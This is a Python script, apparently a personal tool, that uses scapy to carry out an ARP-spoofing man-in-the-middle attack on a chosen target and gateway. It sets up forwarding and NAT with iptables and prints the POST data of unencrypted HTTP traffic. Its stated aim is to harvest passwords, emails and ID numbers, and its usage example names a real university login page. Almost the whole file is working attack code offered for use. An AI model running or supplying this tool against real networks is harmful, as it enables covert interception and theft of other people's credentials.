#!/usr/bin/env python3.11
#
# sniffer_web.py - It tries to get access credentials such
#   passwords, emails, ID numbers from non-tls websites.
#
# Author            - José V S Carneiro <git@josevaltersilvacarneiro.net>
#
# ------------------------------------------------------------------
#
# Examples:
#   # sniffer_web.py --iface eth0 --gateway_ip 192.168.0.1 --target_ip 192.168.0.6  # Warning: privileged port
#
# Convinces the target computer that this machine is the gateway
#   and convinces the gateway that this computer responds for the target computer.
#   With this, traffic from TARGET_IP can be read for this script.
#   After running the above command, access http://csa.uefs.br/index.php/loginCSA/not_logged_in
#   on the target computer and type your credentials.
#
# ------------------------------------------------------------------
#
# History:
#
#       Version: 0.1 2023-06-27, José V S Carneiro, <git@josevaltersilvacarneiro.net>
#           - First Version
#
# Copyright: GPLv3

import argparse

from typing import Union

from scapy.all import *

import os
import sys
import threading
import signal

def configure_nat(gateway_ip: str, target_ip: str, iface: str) -> None:
    """Configures the NIC to act in bridge mode."""

    os.system(f"iptables -t nat -A POSTROUTING -s {target_ip} -o {iface} -j MASQUERADE")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def packet_callback(packet: Packet) -> None:
    """Processes the packet and performs an action."""

    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 80:
            payload = packet[Raw].load.decode("UTF-8")
            if "POST" in payload:
                # Find Content-Type header
                content_type_index = payload.find("Content-Type:")
                if content_type_index != -1:
                    # Find end of headers
                    headers_end_index = payload.find("\r\n\r\n")
                    if headers_end_index != -1:
                        # Extract POST data
                        post_data = payload[headers_end_index + 4:]
                        print("POST data:", post_data)

def restore_target(gateway_ip: str, gateway_mac: str, target_ip: str, target_mac: str) -> None:
    """Restores the ARP table to the values before the attack."""

    print("[*] Restoring target")

    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
        hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)

    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
        hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)

    # tells the main thread to kill
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address: str) -> Union[str, None]:

    responses, unanswered = \
        srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), timeout=2, retry=10)
    
    for s, r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip: str, gateway_mac: str, target_ip: str, target_mac: str) -> None:
    """@see https://en.wikipedia.org/wiki/ARP_spoofing"""

    poison_target          = ARP()
    poison_target.op       = 2
    poison_target.psrc     = gateway_ip
    poison_target.pdst     = target_ip
    poison_target.hwdst    = target_mac

    poison_gateway          = ARP()
    poison_gateway.op       = 2
    poison_gateway.psrc     = target_ip
    poison_gateway.pdst     = gateway_ip
    poison_gateway.hwdst    = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(5)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] ARP poison attack finished")

    return
    
def main(interface: str, gateway_ip: str, target_ip: str) -> int:
    """Starts the script."""

    # sets the interface
    conf.iface  = interface

    # disables the output
    conf.verb   = 0

    print("[*] Setting up %s" % interface)

    # configuring the NAT
    configure_nat(gateway_ip, target_ip, interface)

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        return 1
    else:
        print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

    target_mac  = get_mac(target_ip)

    if target_mac is None:
        print("[!!!] Failed to get MAC. Exiting.")
        return 1
    else:
        print("[*] Target %s is at %s" % (target_ip, target_mac))

    # starts the poisoning threading
    poison_thread = threading.Thread(target=poison_target,
        args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print("[*] Starting sniffer")

        bpf_filter = "tcp port 80 and host %s" % target_ip
        sniff(filter=bpf_filter, prn=packet_callback, iface=interface)

        # restores the network
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    except KeyboardInterrupt:
        # restores the network
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    return 0

if __name__ == '__main__':

    argparser = argparse.ArgumentParser(
        description='Usage: arper.py --iface [interface] --target_ip [ip] --gateway_ip [gateway]'
    )

    argparser.add_argument(
        '--iface',
        type=str,
        help='the interface that will to listen',
        required=True
    )

    argparser.add_argument(
        '--gateway_ip',
        type=str,
        help='the gateway from your local network',
        required=True
    )

    argparser.add_argument(
        '--target_ip',
        type=str,
        help='the ip address of your target',
        required=True
    )

    args = argparser.parse_args()

    exit(main(args.iface, args.gateway_ip, args.target_ip))

